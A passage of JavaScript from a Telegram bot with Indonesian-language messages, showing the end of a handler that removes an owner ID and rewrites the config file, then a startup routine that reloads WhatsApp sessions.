      await bot.sendMessage(chatId, `⚠️ User ${ownerIdToRemove} tidak ditemukan sebagai owner.`);
      return;
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);
    await bot.sendMessage(chatId, `✅ User ${ownerIdToRemove} dihapus dari owner.`);
  } catch (error) {
    console.error("Error removing owner:", error);
  }
});

// Memuat ulang sesi WhatsApp saat bot start
(async () => {
  console.log(chalk.cyan("🚀 Memulai bot Telegram..."));
  await reloadAllWhatsAppSessions();
  console.log(chalk.green("✅ Bot siap digunakan!"));
})();

console.log(chalk.green("✅ Bot Telegram berhasil dijalankan!"));